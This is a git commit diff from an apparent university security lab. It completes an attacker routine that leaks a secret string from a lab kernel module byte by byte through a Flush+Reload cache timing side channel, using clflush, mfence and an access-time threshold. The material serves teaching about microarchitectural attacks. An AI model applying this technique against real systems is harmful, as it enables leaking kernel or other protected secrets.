609e16228af65547e9d3cc0576d030f935545b1c
luyili <luyili@eng.ucsd.edu>
2022-10-28 15:50:50 -0700

    finish LAB2_part1, 20221028_1540

--- LAB2/part1-src/attacker-part1.c
+++ LAB2/part1-src/attacker-part1.c
@@ -11,6 +11,7 @@
 
 #include "lab2.h"
 #include "lab2ipc.h"
+#define CACHE_THRESHOLD 90
 
 /*
  * call_kernel_part1
@@ -40,9 +41,20 @@ static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t 
 int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[LAB2_SECRET_MAX_LEN];
     size_t current_offset = 0;
+    uint64_t junk = 0;
+
+    uint64_t time[LAB2_SHARED_MEMORY_NUM_PAGES] = {0};
 
     printf("Launching attacker\n");
-
+    //printf("shared memory start: %p\n", shared_memory);
+    
+    
+    //warm-up
+    for (int i = 0; i < 100000; i++)
+        junk = 2*i + 1;
+    
+    
+    asm volatile("mfence\n\t":::);	
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
 
@@ -51,6 +63,30 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Use "call_kernel_part1" to interact with the kernel module
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
+        
+        for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
+            clflush(&shared_memory[LAB2_PAGE_SIZE * i]);
+
+            asm volatile("mfence\n\t":::);	
+            call_kernel_part1(kernel_fd, shared_memory, current_offset);
+            call_kernel_part1(kernel_fd, shared_memory, current_offset);
+            call_kernel_part1(kernel_fd, shared_memory, current_offset);
+
+            time[i] = time_access(&shared_memory[LAB2_PAGE_SIZE * i]);
+        }
+
+        asm volatile("mfence\n\t":::);
+        for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
+            if (time[i] < CACHE_THRESHOLD) leaked_byte = i;
+        }
+        
+        /*
+        printf("current offset = %ld\n", current_offset);
+        for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
+            printf("time#%d: %ld\n", i, time[i]);
+        }
+        printf("=====================\n");
+        */
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
